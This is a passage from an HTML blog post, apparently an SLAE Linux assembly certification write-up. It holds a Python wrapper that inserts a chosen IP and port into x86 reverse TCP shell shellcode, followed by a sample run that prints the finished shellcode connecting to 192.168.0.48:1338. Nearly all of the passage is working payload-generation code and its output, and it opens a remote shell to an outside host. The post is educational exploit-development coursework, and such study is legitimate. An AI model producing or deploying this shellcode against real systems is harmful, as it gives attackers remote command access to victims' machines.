</span></span><span class=line><span class=cl>    <span class=n>hex_ip</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>octet</span><span class=p>)</span><span class=o>^</span><span class=mi>255</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;0x&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x&#34;</span><span class=p>)</span> <span class=k>for</span> <span class=n>octet</span> <span class=ow>in</span> <span class=n>ip</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=n>str_port</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>port</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x03\x68</span><span class=si>{ip}</span><span class=s2>\x83\x34\x24\xff\x66\x68</span><span class=si>{port}</span><span class=s2>\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1    \x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>hex_port</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=se>\\</span><span class=s2>x</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_port</span><span class=p>[:</span><span class=mi>2</span><span class=p>],</span> <span class=n>str_port</span><span class=p>[</span><span class=mi>2</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x00&#34;</span> <span class=ow>in</span> <span class=n>hex_port</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Sorry, null byte found in that port, chose another port.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Ports between 1-256 will always contain a null byte.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Port: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hex_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x00&#34;</span> <span class=ow>in</span> <span class=n>hex_ip</span> <span class=ow>or</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x0&#34;</span> <span class=ow>in</span> <span class=n>hex_ip</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Sorry, a null byte was found in the XORed value, this is the end for you...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Value: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hex_ip</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{port}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>hex_port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{ip}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>hex_ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Reverse TCP shell connecting to </span><span class=si>{ip}</span><span class=s2>:</span><span class=si>{port}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip</span><span class=o>=</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Your Shellcode:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 wrapper.py &lt;ip&gt; &lt;port&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>1024</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Warning: Ports &lt; 1024 must be run as a root&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>65535</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Port too large&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>main</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span>
</span></span></code></pre></td></tr></table></div></div><p>Running the script yields:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_2$ python wrapper.py 192.168.0.48 1338
[+] Reverse TCP shell connecting to 192.168.0.48:1338
[+] Your Shellcode:
\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x03\x68\x3f\x57\xff\xcf\x83\x34\x24\xff\x66\x68\x05\x3a\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80
</code></pre><p>Screenshot showing the TCP reverse shell in action!</p><p><img src=demo.png alt="TCP Reverse shell"></p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script></body></html>